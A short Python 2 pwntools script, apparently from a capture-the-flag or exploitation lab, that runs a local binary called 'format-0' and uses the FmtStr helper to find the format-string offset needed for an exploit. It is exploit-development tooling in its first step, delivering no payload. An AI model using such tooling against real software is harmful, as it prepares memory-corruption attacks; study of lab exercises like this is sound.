#!/usr/bin/python2

from pwn import *
def find_offset(payload):
    sh = process('./format-0')
    sh.sendline(payload)
    getbuf = sh.recv()
    sh.close()
    return getbuf

if __name__ == '__main__':
    fmt = FmtStr(find_offset)
    print(fmt.offset)
